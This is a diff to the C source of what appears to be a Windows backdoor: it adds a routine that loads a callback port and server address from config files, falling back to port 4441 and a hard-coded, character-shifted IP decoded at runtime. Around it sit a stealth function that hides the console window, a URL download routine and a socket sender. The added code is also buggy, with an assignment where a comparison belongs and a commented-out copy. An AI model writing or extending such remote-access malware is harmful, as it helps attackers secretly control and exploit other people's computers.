@@ -26,6 +26,14 @@ char decr(char ch);
 int iscommand(char buf);
 int download(char * url);
 int sendui(int s, char uin, int * bs);
+void stealth();
+
+typedef struct {
+
+	int portno;
+	char ip[16];
+
+} fileWrapper;
 
 /*
  * get buf and check if p4p1 custom command
@@ -129,6 +137,63 @@ void stealth()
 	AllocConsole();
 	stealth=FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(stealth, 0);
+}
+
+void init_file(fileWrapper * ads)
+{
+
+	FILE * portfile = fopen("port.cfg", "r");
+	FILE * ipfile = fopen("ip.cfg", "r");
+	char portchar[6];
+	char ipchar[16];
+
+
+	if( portfile == NULL ){
+		ads->portno = 4441;
+	} else {
+		int i = 0;
+		char c;
+		while( (c = fgetc(portfile)) != EOF ){
+			portchar[i] = c;
+			i++;
+		}
+		portchar[i+1] = '\0';
+
+		ads->portno = atoi(portchar);
+		fclose(portfile);
+	}
+
+	if(ipfile = NULL){
+
+		char ipjib[14] = "97/358/316/213";
+		char corip[14];
+
+		int i;
+
+		for(i = 0; i < strlen(ipjib); i++){
+			char ch;
+			ch = ipjib[i];
+			corip[i] = decr(ch);
+		}
+
+		strcpy(ads->ip, corip);
+
+	} else {
+		printf("getip\n");
+		int i = 0;
+		char c;
+		while( (c = fgetc(ipfile)) != EOF ){
+			printf("get shitz\n");
+			ipchar[i] = c;
+			i++;
+		}
+		ipchar[i] = '\0';
+
+		//strcpy(ads->ip, ipchar);
+		fclose(ipfile);
+
+	}
+
 }
 
 /*
